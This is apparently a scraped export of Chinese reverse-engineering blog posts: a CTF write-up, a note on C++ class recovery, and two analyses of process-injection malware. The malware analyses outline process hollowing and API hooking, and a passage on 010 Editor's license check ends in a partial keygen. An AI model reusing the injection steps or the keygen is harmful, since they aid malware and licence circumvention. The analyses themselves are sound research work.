0x67, 0x72, 0x64, 0x4C, 0x70, 0x44, 0x7C, 0x5F, 0x2A, 0x48, 0x44, 0x41, 0x1C, 0x61, 0x72, 0x1A, 0x17]def printArr(arr): for i in range(0, len(arr)): s += chr(arr[i]) print sprintArr(flag) 没法子，我也不可能玩30分钟，只好暴力解决了，修改了几个比较，成功进入异常处理（请原谅我，看着真是异常处理），注释中是几次暴力修改位置：123456789101112131415161718192021222324//.text:08049D75 jz loc_8049EA0 if ( v11 &amp;&amp; v6 == target_y )//!=text:08049EA6 jnz loc_8049D7B &#123; ++dword_804C3C0; if ( dword_804C3C0 == 5 * dword_804C3C0 / 5 ) ++dword_804C3D8; if ( dword_804C3C0 == 3 * dword_804C3C0 / 3 ) ++dword_804C3D4; if ( dword_804C3C0 == 30 )//!=.text:08049EFD jz loc_8049F94 &#123; if ( dword_804C3D8 == 6 )//!=text:08049F9B jnz loc_8049F03 &#123; if ( dword_804C3D4 == 10 )//!=.text:08049FA8 jnz loc_8049F03 &#123; v16 = __cxa_allocate_exception(); //执行异常中会调用chk(3)，显示Mission Complete，然后居然没有调用打印flag， //看到有个.text:0804A039 cmp ds:dword_804C3DC, 3Bh //.text:0804A040 jg short loc_804A051强制跳转到打印flag //会进入f5没解析成功的代码，最后我都没弄清，是出题人故意的，还是ida能力问题，亦或是我的问题 *(_DWORD *)v16 = 0; __cxa_throw(v16, &amp;_typeinfo_for_int, 0, v17); &#125; &#125; &#125; ok,终于打印出来了U0NURntzMWduNGxfMXNfZnVubnk6KX0=，base64解码之后SCTF{s1gn4l_1s_funny:)}，做出来还是比较兴奋的 4. 其他其他题目也尝试了很多。re300，算法太绕，晕了，没去弄了，后面提示是三阶魔方，你妹啊，被吓住了，最后也没人做出来re500，又来了个lua虚拟机，额，我再次败退，这次比赛逆向题基本完败，丢人。图片题貌似是两题，用自己知道的各种方式尝试了，无果。web题目，额，我scan了一题，看到了个head attck，然后不会了。pwn题目，好简单，可是，路在何方？求writeup啊。哦，还有两道code的题目，code200在我们努力下，队友提交成功，code400目前还在暴力运算中，明天看看有答案不（求思路，野路子只有暴力破了，也不知道对不）。我想说code500，请问3 3 1是几个意思啊。按我们分析的思路弄出来了，跟我说wrong input！逗我呢啊，要writeup！ 最后总结：太急躁，没思路，最后还是能力问题！","tags":[{"name":"ctf","slug":"ctf","permalink":"https://anhkgg.github.io/tags/ctf/"},{"name":"sctf","slug":"sctf","permalink":"https://anhkgg.github.io/tags/sctf/"},{"name":"writeup","slug":"writeup","permalink":"https://anhkgg.github.io/tags/writeup/"}]},{"title":"some thing in c++ reverse","date":"2014-12-05T09:10:20.000Z","path":"some-thing-in-c-reverse/","text":"1. 工具逆向中，在c++类识别中，IDA能够比较好完成一些工作。由于此类经验较少，写上一点自己的总结，不对之处，请指正，或者有更好的经验，请大牛们指导，最好能放点com逆向的经验就更好了。 2. 寻找构造函数在分析mfc程序中，很多时候，对应响应函数的查找比较麻烦。比如，注册验证中，无法定位按钮点击之后的响应函数，无法对获取输出函数下断，无法弹框下断。但是可以对控件类下断，比如窗口初始化中，控件初始化，可以对某些控件类进行下断，如CButton::CButton，那么就可以回溯到窗口的构造函数中了。至于如何获取CButton::CButton地址，那就要结合ida（符号文件）之类的的 3. 虚表在窗口的构造函数中，一般会对对象进行初始化，很重要的一个就是虚表指针的初始化，嘿嘿，那么我们就可以到虚表指针一观了，看到了什么，恩，类脱光了衣服（别想歪了），我们可以很方便找到窗口类的各种相应函数了，详细就多说了，各自体会吧 4. 详细分析既然找到了响应函数，那么后续的就是详细的分析了。 5. 总结这只是自己的一点点小小总结，内容较少，希望对大家有点帮助，还是那句话，请大家多交流，多指导。某对于com逆向真是，，，一个字，，，很晕。","tags":[{"name":"reverse","slug":"reverse","permalink":"https://anhkgg.github.io/tags/reverse/"},{"name":"c++","slug":"c","permalink":"https://anhkgg.github.io/tags/c/"}]},{"title":"inject process analyze 2","date":"2014-11-25T09:45:00.000Z","path":"inject-process-analyze 2/","text":"1. 来源某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。前面分析了一种进程注入方法，现在开始分析另外一种貌似更猥琐的方式，貌似说这种技术用在ramnit病毒中，下面这图是大致原理图（引用的）简单测试了下，CreateProcess时，会多次调用ZwWriteVirtualMemroy，本以为是写入PE文件的，结果没有看到，所有有点不明白，钩住ZwWriteVirtualMemroy怎么用，文章中提到的是这样：The hooked Windows native system service redirects the code execution flow to the module defined in the caller process to perform the code injection routine. The injected code in the new process includes the capability for file infection (Windows executable and HTML files), as well as backdoor and downloader functionalities.大意可能是各位写入进程中一些代码，比如backdoor，downloader，但是就是不明白如何执行起来，所以需要找个样本来学习一下，如何利用 2. 样本获取在卡饭中搜索到了几个可能是ramnit的样本，有两个没有解压密码，气死了，其他的都是upx3.0加壳，妹啊，脱不了啊，最后下了个交desktoplayer.exe，以为没壳了，结果弄了半天还是upx3.0.8，最后，直接OD吧，断了几次CreateProcessA，可以看到创建了iexplorer.exe，但是参数貌似不是CREATE_SUSPENDED（后面才想起，这种方式不用），然后就想直接在ZwWriteVirtualMemory下断，od没法了，转到windbg吧，有了下面的分析 3. 分析首先想到就是直接对zwwritevirtualmemory下断，然后回溯到inject代码中，结果居然会崩。。这。。不过还是找到了inject代码123456789101112131415161718192021222324252627282930313233343536370:000&gt; bp ntdll!zwwritevirtualmemory0:000&gt; g(7e8.af4): Break instruction exception - code 80000003 (first chance)eax=00960000 ebx=000009c6 ecx=0012f0b0 edx=7c92e4f4 esi=7c92df90 edi=0012f56ceip=00930005 esp=0012f094 ebp=0012f0b4 iopl=0 nv up ei pl nz na pe cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0000020700930005 cc int 30:000&gt; g(7e8.af4): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=ba960002 ebx=000009c6 ecx=0012f0b0 edx=7c92e4f4 esi=7c92df90 edi=0012f56ceip=7c92df96 esp=0012f094 ebp=0012f0b4 iopl=0 nv up ei ng nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010282ntdll!ZwWriteVirtualMemory+0x6:7c92df96 0003 add byte ptr [ebx],al ds:0023:000009c6=??0:000&gt; kn # ChildEBP RetAddr 00 0012f090 00402a74 ntdll!ZwWriteVirtualMemory+0x6WARNING: Stack unwind information not available. Following frames may be wrong.01 0012f0b4 7c81a636 image00400000+0x2a74//这里既是调用ZwWriteVirtualMemory的代码02 0012f3ac 7c819da8 kernel32!BasePushProcessParameters+0x28103 0012fe0c 7c81d627 kernel32!CreateProcessInternalW+0x184e04 0012fef8 7c802397 kernel32!CreateProcessInternalA+0x29c05 0012ff30 004013c0 kernel32!CreateProcessA+0x2c06 0012ffb4 00402cda image00400000+0x13c007 0012fff0 00000000 image00400000+0x2cda0:000&gt; ub 7c81a636kernel32!BasePushProcessParameters+0x266:7c81a61b 6a00 push 07c81a61d 53 push ebx7c81a61e 56 push esi7c81a61f 8b85ccfdffff mov eax,dword ptr [ebp-234h]7c81a625 ff7048 push dword ptr [eax+48h]7c81a628 ffb580fdffff push dword ptr [ebp-280h]7c81a62e 8b350014807c mov esi,dword ptr [kernel32!_imp__NtWriteVirtualMemory (7c801400)]7c81a634 ffd6 call esi//这里既是调用ZwWriteVirtualMemory的代码 对7c81a634 下断，重新加载程序，g123456789101112131415161718192021220:000&gt; bp 7c81a6340:000&gt; gModLoad: 76300000 7631d000 C:\\WINDOWS\\system32\\IMM32.DLLModLoad: 62c20000 62c29000 C:\\WINDOWS\\system32\\LPK.DLLModLoad: 73fa0000 7400b000 C:\\WINDOWS\\system32\\USP10.dllModLoad: 77180000 77283000 C:\\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\\comctl32.dllModLoad: 5d170000 5d20a000 C:\\WINDOWS\\system32\\comctl32.dll(1ec.1f4): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000001 ebx=84493bb9 ecx=7ffdf000 edx=00150608 esi=00150000 edi=84493bb1eip=7c98d811 esp=0012fc38 ebp=0012fc98 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246ntdll!RtlDebugFreeHeap+0x82:7c98d811 0fb707 movzx eax,word ptr [edi] ds:0023:84493bb1=????0:000&gt; gBreakpoint 0 hiteax=00960000 ebx=000009c6 ecx=0012f0b0 edx=7c92e4f4 esi=7c92df90 edi=0012f56ceip=7c81a634 esp=0012f0bc ebp=0012f3ac iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246kernel32!BasePushProcessParameters+0x27f:7c81a634 ffd6 call esi &#123;ntdll!ZwWriteVirtualMemory (7c92df90)&#125; 确认一下ZwWriteVirtualMemory被hook1234567890:000&gt; u 7c92df90ntdll!ZwWriteVirtualMemory:*** WARNING: Unable to verify checksum for image00400000*** ERROR: Module load completed but symbols could not be loaded for image004000007c92df90 e9c44aad83 jmp image00400000+0x2a59 (00402a59)7c92df95 ba0003fe7f mov edx,offset SharedUserData!SystemCallStub (7ffe0300)7c92df9a ff12 call dword ptr [edx]7c92df9c c21400 ret 14h7c92df9f 90 nop 想着就在这把文件dump出来，在ida中看方便点，然后再od中下断，为了怕跑飞，也对CreateProcessA下断了，然后运行，现在CreateProcessA中断下来，回溯了一下，看着堆栈栈帧很少，就尝试看能够脱壳不很笨的下断回溯了两次，到了00402C5B ，一点都不想c入口，但是上次没有，调用地址是0012FFC4 7C817067 返回到 kernel32.7C817067也不像是壳进行了入口的patch，将就吧，dump出来，importrect修复了一下，嘿，在ida中一看，还不错，入口代码这样的：123456700402C5B 68 00040000 push 0x40000402C60 68 D0DF4000 push DesktopL.0040DFD000402C65 E8 AEEAFFFF call DesktopL.0040171800402C6A 83F8 01 cmp eax,0x100402C6D 75 70 jnz short DesktopL.00402CDF00402C6F 68 00404000 push DesktopL.00404000 ; ASCII &quot;KyUffThOkYwRRtgPP&quot;00402C74 E8 66EAFFFF call DesktopL.004016DF 马上定位到image00400000+0x2a59，修复的还不错，这下子方便多了，可以直接f5，但是不能正常执行123456789101112131415161718192021222324252627282930__int64 __stdcall myHookZwWriteVirtualMemory(HANDLE hProcess, int a2, int a3, int a4, int a5) &#123; LODWORD(v5) = mySysZwWriteVirtualMemory(hProcess, a2, a3, a4, a5, NumberOfBytesWritten, flOldProtect, v12);// 调用原函数 NumberOfBytesWritten = (SIZE_T)&amp;v12;v9 = v5;if ( hProcess != (HANDLE)-1 )&#123;if ( !myInjectFlag )&#123;if ( !lpAddress ) // 初始化为0&#123;EOP = (void *)myGetEOP(hProcess); // 获取到宿主进程EOPif ( EOP )&#123;myInjectFlag = 1;lpAddress = EOP;dword_40DFA8 = myInjectMyExe(hProcess, (int)&quot;MZ, 0x9800u);dword_40DFAD = v7;if ( dword_40DFA8 )&#123;VirtualProtectEx(hProcess, lpAddress, 0xCu, 0x40u, &amp;flOldProtect);WriteProcessMemory(hProcess, lpAddress, &amp;byte_40DFA7, 0xCu, &amp;NumberOfBytesWritten); //入口感染VirtualProtectEx(hProcess, lpAddress, 0xCu, flOldProtect, &amp;flOldProtect);&#125;&#125;&#125;&#125;&#125;return v9;&#125; 在钩子函数中，工作很少，获取到宿主进程EOP，在宿主进程中加载自己的程序，然后对EOP进行感染，也就是跳转到自己的程序代码空间代码基本就这么多了，最后怎么玩就靠自己的代码了。 3. 技术总结其实和另一个中注入方式大同小异，目标都是为了将自己的程序映射到宿主进程空间中。一个直接暴力suspend，读写，另一个在创建进程过程中进行读写。由于两种方式都有远程进程读写操作，都应该会被主防拦住，貌似现在效果也不是很好了是否可以再读写内存时，对主防进行欺骗呢，还需要研究….","tags":[{"name":"inject process","slug":"inject-process","permalink":"https://anhkgg.github.io/tags/inject-process/"},{"name":"reverse","slug":"reverse","permalink":"https://anhkgg.github.io/tags/reverse/"}]},{"title":"inject process analyze and code","date":"2014-11-25T09:45:00.000Z","path":"inject-process-analyze-and-code/","text":"1. 起因某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。 2. 分析与实现2.1 PEID壳信息：Microsoft Visual C++ v6.0，无壳文件名：bbs.exe既然无壳，直接ida先分析一下，遇到无法分析的OD继续调试。 2.2 分析打开IDA，拖入文件，找到主函数：123456789101112131415.text:0040A720 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd).text:0040A720.text:0040A720 push ebp.text:0040A721 mov ebp, esp.text:0040A723 push ecx.text:0040A724 call sub_408BE0.text:0040A729 mov esp_4FEE68, esp.text:0040A72F mov esp_4FEE6C, ebp.text:0040A735 call sub_408929//主功能函数.text:0040A73A mov [ebp+var_4], eax.text:0040A73D mov eax, [ebp+var_4].text:0040A740 mov esp, ebp.text:0040A742 pop ebp.text:0040A743 retn 10h.text:0040A743 _WinMain@16 endp 没什么东西，继续sub_408929：12345678910111213141516171819202122.text:00408929 sub_408929 proc near ; CODE XREF: WinMain(x,x,x,x)+15.text:00408929 cld.text:0040892A fninit.text:0040892C call myNewObj.text:00408931 push offset sub_406C2A.text:00408936 mov eax, 3.text:0040893B call myInitFunc.text:00408940 add esp, 4.text:00408943 call sub_40101D//这几个都是些无用函数，多半是花指令.text:00408948 call sub_406B84.text:0040894D call sub_406BDB.text:00408952 call sub_401000.text:00408957 call sub_406BBE.text:0040895C call sub_406BA1.text:00408961 call sub_406BF8.text:00408966 call myReleaseFile//文件释放，可能是功能文件.text:0040896B push eax ; uExitCode.text:0040896C call nullsub_1.text:00408971 call j_myExit.text:00408976 add esp, 4.text:00408979 retn.text:00408979 sub_408929 endp 其他函数都没有什么重要的代码，接着看看myReleaseFile，代码太多，直接f5看看整体流程，结构：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl myReleaseFile()&#123; lpMem = &quot;QzpcUHJvZ3JhbSBGaWxlc1xDb21tb24gRmlsZXNcTWljcm9zb2Z0IFNoYXJlZFxNU0luZm9ca2trLnR4dA==&quot;;// C:\\Program Files\\Common Files\\Microsoft Shared\\MSInfo\\kkk.txt v12 = (void *)myBase64Dec(&amp;lpMem); if ( lpMem ) j_myIsInMyImg(lpMem); v1 = (int)v12; if ( !v12 ) v1 = (int)dword_416285; pszPath = (LPCSTR)myFormat(ebp0, 1, (unsigned int)v1, 0x80000005u);// C:\\Program Files\\Common Files\\Microsoft Shared\\MSInfo\\kkk.txt v2 = (int)v12; if ( v12 ) j_myIsInMyImg(v12); v10 = (int *)&amp;v6; v3 = PathFileExistsA(pszPath); if ( (void **)v10 != &amp;v6 ) v3 = myRunError(v2, 6); v9 = v3; if ( pszPath ) j_myIsInMyImg((void *)pszPath); if ( v9 == 1 ) &#123; lpMem = &quot;我是一个中国人&quot;;//恩，很爱国 v12 = &quot;34,85,10,1D,04,D1,CF,42,DF,A4,B0,&quot;; pszPath = (LPCSTR)myDecStr(&amp;v12, &amp;lpMem); // 字符串解密，&quot;svchost.exe&quot; if ( v12 ) j_myIsInMyImg(v12); if ( lpMem ) j_myIsInMyImg(lpMem); v4 = j_myNewBuf(ebp0, 0x10u); v10 = (int *)v4; *(_DWORD *)v4 = 0; *((_DWORD *)v4 + 1) = 0; *((_DWORD *)v4 + 2) = 0; *((_DWORD *)v4 + 3) = 0; v9 = 0; v8 = 0; v7 = 0; v6 = &amp;unk_4162BE; myWork(&amp;v6, &amp;v7, 0, &amp;pszPath, 1, 0, 0, 0, 0, &amp;v10, 0);//注入进程的功能，代码中很多混淆 if ( v6 ) j_myIsInMyImg(v6); if ( v7 ) j_myIsInMyImg(v7); if ( pszPath ) j_myIsInMyImg((void *)pszPath); j_myIsInMyImg(v10); sub_40574F(); &#125; return 0;&#125; 由于在myWork中太多混淆，IDA无力，转战OD，看到高大上的进程注入。由于代码混淆，太多PE操作，而且IDA没有有效识别内存拷贝函数，给分析带来了较大困难。下面是主要的进程注入用到的函数表，myWork中调用这些关键函数，都是通过该函数表调用，里面通过loaddll+getprocaddress获取到函数地址，返回，然后调用：12345678910111213141516171819202122232425.data:004FB87F myLocalSize1 dd offset myLocalSize ; DATA XREF: .text:00402CAC r.data:004FB883 myRtlMoveMemory1 dd offset myRtlMoveMemory ; DATA XREF: .text:00402F32 r.data:004FB887 myLocalSize2 dd offset sub_4089DC ; DATA XREF: .text:00403303 r.data:004FB88B myRtlMoveMemory2 dd offset sub_4089F2 ; DATA XREF: .text:00403701 r.data:004FB88F myLocalSize3 dd offset sub_408A08 ; DATA XREF: .text:00403A06 r.data:004FB893 myCreateProcessA dd offset sub_408A1E ; DATA XREF: .text:00403DEE r.data:004FB897 myGetThreadContext dd offset sub_408A34 ; DATA XREF: sub_403FC0+C8 r.data:004FB89B myReadProcessMemory dd offset sub_408A4A ; DATA XREF: sub_403FC0+2E9 r.data:004FB89F myZwUnmapViewOfSection dd offset sub_408A60 ; DATA XREF: sub_403FC0+335 r.data:004FB8A3 myVirtualAllocEx dd offset sub_408A76 ; DATA XREF: sub_403FC0+3AC r.data:004FB8A7 myWriteProcessMemory dd offset sub_408A8C ; DATA XREF: sub_403FC0+43F r.data:004FB8AB myLocalSize5 dd offset sub_408AA2 ; DATA XREF: sub_403FC0+9A7 r.data:004FB8AF myRtlMoveMemory_0 dd offset sub_408AB8 ; DATA XREF: sub_403FC0+B0E r.data:004FB8B3 myVirtualProtectEx dd offset sub_408ACE ; DATA XREF: sub_403FC0+D60 r.data:004FB8B7 myWriteProcessMemory_0 dd offset sub_408AE4 ; DATA XREF: sub_403FC0+DD2 r.data:004FB8BB mySetThreadContext dd offset sub_408AFA ; DATA XREF: sub_403FC0+FA8 r.data:004FB8BF myResumeThread dd offset sub_408B10 ; DATA XREF: sub_403FC0+1172 r.data:004FB8C3 myWaitForSingleObject dd offset sub_408B26 ; DATA XREF: sub_403FC0+11AD r.data:004FB8C7 myCloseHandle_ dd offset sub_408B3C ; DATA XREF: sub_403FC0+11E6 r.data:004FB8CB myGetEnvironmentVariableA dd offset sub_408B52.data:004FB8CF myTerminateProcess dd offset sub_408B68 ; DATA XREF: sub_4053DE+1E r.data:004FB8D3 myReadFileEx dd offset sub_408B7E ; DATA XREF: sub_405FAA+1E2 r.data:004FB8D7 myGetFileSize dd offset sub_408B94 ; DATA XREF: sub_4063B0+DF r.data:004FB8DB myCloseHandle dd offset sub_408BAA ; DATA XREF: sub_4064C4+1D r.data:004FB8DF myLocalFree dd offset sub_408BC0 ; DATA XREF: sub_4065D9+541 r 获取函数的代码结构：12345678.text:004089B0 myLocalSize proc near ; CODE XREF: .text:00402CAC p.text:004089B0 ; DATA XREF: .data:myLocalSize1 o.text:004089B0 push offset myLocalSize1 ; int.text:004089B5 push offset aLocalsize ; &quot;LocalSize&quot;.text:004089BA push offset aKernel32 ; &quot;kernel32&quot;.text:004089BF call myGetProc.text:004089C4 jmp eax.text:004089C4 myLocalSize endp 最后基本总结了myWork的代码逻辑，也一窥了进程注入的猥琐：1234567891011121314151617CreateProcessA(0, &quot;svchost.exe&quot;, 0, 0, 0, 4/*CREATE_SUSPENDED*/, 0, 0, &amp;sa, &amp;pi );//按suspend创建进程，这样主线程就会挂起，等待后面的宰割GetThreadContext(pi.hThread, &amp;context);ReadProcessMemory(pi.hProcess, 0x7ffde008/*peb-&gt;ImageBaseAddress*/, buf, 4, &amp;size); /*获取到的是img基地址 peb-&gt;ImageBaseAddress*/ZwUnmapViewOfSection(pi.hProcess, buf);//这里有个bug，buf传递方式错误，导致无法unmap，应该是&amp;bufVirtualAllocEx(pi.hProcess, 0x400000, size, MEM_COMMIT|MEM_RESERVE/*0x3000*/, PAGE_READWRITE/**4/ );//解析PE文件，写入进程对应位置WriteProcessMemory(pi.hProcess, 0x400000, buf, 0x1000, &amp;size);//写入头部for(i =0 ;i&lt;num_of_sec; i++)&#123; WriteProcessMemory(pi.hProcess, 0x400000+sec[i].va, buf, sec[i].size, &amp;size);//.text, .rdata, .data VirtualProtectEx(pi.hProcess, 0x400000+sec[i].va, sec[i].size, NewProtect, &amp;oldProtect);//PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE&#125;//重写eop//重写基地址WriteProcessMemory(pi.hProcess, 0x7ffde008/*peb-&gt;ImageBaseAddress*/, MyBaseAddr, 4, &amp;size);//写入我的img 基地址 0x400000SetThreadContext(pi.hProcess, context);//恢复ResumeThread(pi.hThread);//恢复线程执行 3. 总结本来打算完整分析一下的，在分析到进程注入时，由于自己代码实现中，遇到了一些问题，调试无语，eop和基地址都改写了，那么就是映射section遇到问题，终于修改成直接pe完整写入宿主进程，成功执行了注入进程的功能。所以，后面也没时间具体分析样本的功能了。测试了该方式，无法过掉主防，在WriteProcessMemory就会被拦截，所以该方式基本只是作为技术研究，直接使用，还需努力。 4. 参考[1] http://www.cnblogs.com/lbq1221119/archive/2008/07/22/1248706.html[2] http://blog.csdn.net/darthas/article/details/12569443","tags":[{"name":"inject process","slug":"inject-process","permalink":"https://anhkgg.github.io/tags/inject-process/"},{"name":"reverse","slug":"reverse","permalink":"https://anhkgg.github.io/tags/reverse/"}]},{"title":"010注册算法分析","date":"2014-11-17T02:13:19.000Z","path":"010注册算法分析/","text":"1. 关键函数定位进入register窗口，随便填入name，然后check license，弹框信息”Invalid name or password. Please enter your name and password exactly as given when you purchased 010 Editor (make sure no quotes are included).”，通过该信息在IDA中找到对应函数地址，基本可以确认是关键函数位置，函数居然有名字，这是作者故意留下的吗。下面是整个验证函数流程： 1234567891011121314151617181920212223242526272829void __usercall chekc(char a1&lt;zf&gt;, int a2&lt;ecx&gt;)&#123; //获取用户名 //是否为空 //获取注册码 //是否为空 //注册码格式检查xxxx-xxxx-xxxx-xxxx-xxxx v42 = (void *)myCheck(mygbName, 3u, &apos;9A&apos;); //注册码验证，返回值v42对于是否注册成功，有很大关系，返回值为231，为失败 v26 = mySecondCheck(mygbName, 3u, &apos;9A&apos;); // 第二次检查，如果返回中为219，就会进入后面的注册成功提示 //myCheck中返回不等于231，mygbName + 44提示进入网络验证，没有弄清楚，哪里会等于1 if ( v42 != (void *)231 &amp;&amp; *(_DWORD *)(mygbName + 44) ) &#123; v27 = myWebCheck((void *)mygbName, 0); if(v27 &lt; 0 ) &#123; v43 = myMsg(&quot;Could not contact the webserver. Please check your internet connection. If your internet connection is currently working, the server may be down. If this problem persists, please visit &apos;http://www.sweetscape.com/support/&apos; (&quot;, 0xFFFFFFFFu); &#125; if ( !v27 ) &#123; v43 = myMsg( &quot;010 Editor has detected that you have entered an invalid license. Please check to see if your license is entered correctly and try again. If this problem persists, please visit &apos;http://www.sweetscape.com/support/&apos;.&quot;, 0xFFFFFFFFu); &#125; v33 = mySecondCheck(mygbName, 3u, &apos;9A&apos;);//网络验证是否成功，成功，返回219 &#125; if ( v43 == (void *)219 ) // v43 == 219，注册成功 &#123; v43 = myMsg(&quot;Password accepted. Thank you for purchasing 010 Editor!&quot;, 0xFFFFFFFFu); //写入注册表 &#125;&#125; 2. 算法分析下面看看主要的验证函数myCheck和mySecondCheck，代码如下：1234567891011121314151617signed int __thiscall mySecondCheck(int this, unsigned int a2, unsigned int a3)&#123; int v3; // esi@1 signed int result; // eax@2 int v5; // eax@3 int v6; // eax@6 int v7; // eax@9 v3 = this; if ( *(_DWORD *)(this + 44) ) // 要让这个值等于0，否则进入网络验证，初始化就是0 return 275; v5 = myCheck(this, a2, a3); //可以看到，只有返回值是45时，才能返回219，注册成功 if ( v5 == 45 ) &#123; result = 219; // 返回219， 注册成功 &#125;&#125; 可以看到，只有返回值是45时，才能返回219，注册成功。那么返回myCheck看看，怎么才能得到45的返回值，整个返回值查看一下，只有两处位置，可能返回45，如下：1234567891011121314if ( v26 == 0x9Cu )&#123; v20 = *(_DWORD *)(regdlg + 28) &lt; a2; return (-v20 &amp; 0x21) + 45; // 成功？&#125;if ( v26 != 0xFCu )&#123; if ( v26 == 0xACu &amp;&amp; v33 ) &#123; v20 = v33 &lt; a3; return (-v20 &amp; 0x21) + 45; // 成功？ &#125;return 231;&#125; 那么就需要回溯回去，看看v26，是如何得到的，只有在v26等于0x9c或者0xAc时，才有可能注册成功。下面看看完整代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374int __thiscall myCheck(int this, unsigned int a2, unsigned int a3)&#123; //name和key长度是否为0 //myPassCheck(this, (int)&amp;v23);//将key字符串转换成数值，每两个字符转化成2为十六进制数， //xxxx-xxxx-xxxx-xxxx-xxxx分别对应k1k2-k3k4-k5k6-k7k8-k9k10 //v23其实就是一个数组，存的就是k1-k10 //检测name是否等于&apos;999&apos;,是，则失败 if ( v26 == 0x9Cu ) &#123; LOBYTE(v32) = v23 ^ v28; // k1^k7 LOWORD(v6) = (unsigned __int8)(v24 ^ v29); // k2^k8 LOWORD(v7) = (unsigned __int8)(v25 ^ HIBYTE(v27));// k3^k6 v11 = v7 + ((_DWORD)v6 &lt;&lt; 8); // v11 = k3^k6 + ((k2^k8)&lt;&lt;8) *(_DWORD *)(regdlg + 28) = (unsigned __int8)myCal1(v23 ^ v28);// k1^k7 =&gt; 不能等于0 v9 = myCal2(v11); // 不能等于0 v10 = *(_DWORD *)(regdlg + 28); *(_DWORD *)(regdlg + 32) = (unsigned __int16)v9; // v10==0,v9==0或者v9&gt;0x3e8，返回231 if ( !v10 || !v9 || (unsigned __int16)v9 &gt; 0x3E8u ) return 231; v12 = v10 &lt; 2 ? v10 : 0; // v12 = 0或者1 &#125;else &#123; if(v26 == 0xFC) &#123;//不可能成功 &#125;esle &#123; //v26不等于0xAC，退出，返回231，失败 //myCal2(k3^k6 + ((k2^k8)&lt;&lt;8)) &gt; 0x3E8, 失败 if ( v26 != 0xACu || (v15 = v24 ^ v29,//k2^k8 v16 = v25 ^ HIBYTE(v27),//k3^k6 *(_DWORD *)(regdlg + 28) = 2, v14 = (unsigned __int16)myCal2(v16 + (v15 &lt;&lt; 8)),v11 = k3^k6 + ((k2^k8)&lt;&lt;8) *(_DWORD *)(regdlg + 32) = (unsigned __int16)v14, !(_WORD)v14) || v14 &gt; 0x3E8 ) return 231; //sub_4FD0B9( (k1^k7 + (k9^k5 + (k6^k10)&lt;&lt;8)&lt;&lt;8), xxx); //其实就是凑成十六进制数(k6^k10)(k9^k5)(k1^k7) v17 = sub_4FD0B9( (v23 ^ v28) + (((v30 ^ (unsigned __int8)v27) + ((HIBYTE(v27) ^ v31) &lt;&lt; 8)) &lt;&lt; 8), (char *)loc_5B8C25 + 2); v33 = v17; *(_DWORD *)(regdlg + 52) = v17; v12 = v17; &#125; &#125; //编码name，返回给v18， v18 = myEncStr(*(const char **)(*(_DWORD *)qstrname + 12), v26 != -4, v12, *(_DWORD *)(regdlg + 32)); //如果v18，如0xABCDEF10分解成0xAB，0xCD， 0xEF10,不等于v29, v28,v27就失败，其实就是 //(k6k5) = 0xEF10, k7 = 0xCD, k8 = 0xAB if ( v27 != (_WORD)v18 || v28 != (unsigned __int8)((unsigned int)v18 &gt;&gt; 0x10u) || v29 != (unsigned __int8)((unsigned int)v18 &gt;&gt; 0x18u) ) return 231; // 这三个条件很重要啊 //下面就接近成功了，就是上面提到的返回45的结果，成功 if ( v26 == 0x9Cu ) &#123; //这里就需要regdlg + 28 = myCal1(k1^k7) &gt;= a2,也就是3，传入的a2是3 //然后v20就是0，那么(-v20 &amp; 0x21)=0，最后返回45 v20 = *(_DWORD *)(regdlg + 28) &lt; a2; return (-v20 &amp; 0x21) + 45; // 成功？ &#125; if ( v26 != 0xFCu ) &#123; if ( v26 == 0xACu &amp;&amp; v33 ) &#123; v20 = v33 &lt; a3; return (-v20 &amp; 0x21) + 45; // 成功？ &#125; return 231; &#125;&#125; 最后总结一下算法，基本可以列出一个方程类似的东西：123456k4 = 0x9C或者0xACmyCal1(k1^k7) &gt;= 3;//可以任取大于等于3的值，算出k1^k7=？myCal2(k3^k6 + ((k2^k8)&lt;&lt;8)) &gt; 0;//可以任去大于0myCal2(k3^k6 + ((k2^k8)&lt;&lt;8)) &lt; 0x3E8;//小于0x3E8的某一个值，算出k3^k6 + ((k2^k8)&lt;&lt;8) = ？k8k7k6k5 = v18;//0xABCDEF10，可以得到k5=?,k6=?,k7=?,k8=?，由此可以算出上面的k1,k2sub_4FD0B9((k6^k10)(k9^k5)(k1^k7), xx) = ?//可以算出k9，k10 下面就0x9C的情况写了个注册机 3. 注册机根据上面的注册算法，写了个针对0x9c的注册机：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778DWORD ckname(char* name, int isnotFC, int islowk1k7, DWORD k3k6k2k8 )&#123; int slen = strlen(name); if(slen &gt; 0 ) &#123; DWORD v15 = 0, v17 = 0, v16 = 0, chk = 0, v9 = 0, v8=0, v14 = 0, v5 = 0, v6 = 0; while(v14 &lt; slen) &#123; DWORD v7 = toupper(name[v14]); if(isnotFC) &#123; v9 = dword_B21DC4[(v17 + 15 * k3k6k2k8) &amp; 0xFF] + dword_B21DC4[(v6 + 17 * islowk1k7) &amp; 0xFF] + dword_B21DC4[(v7 + 47) &amp; 0xFF] * ((v5 + dword_B21DC4[v7]) ^ dword_B21DC4[(v7 + 13) &amp; 0xFF]); v8 = v16; &#125; else&#123; v9 = dword_B21DC4[(v17 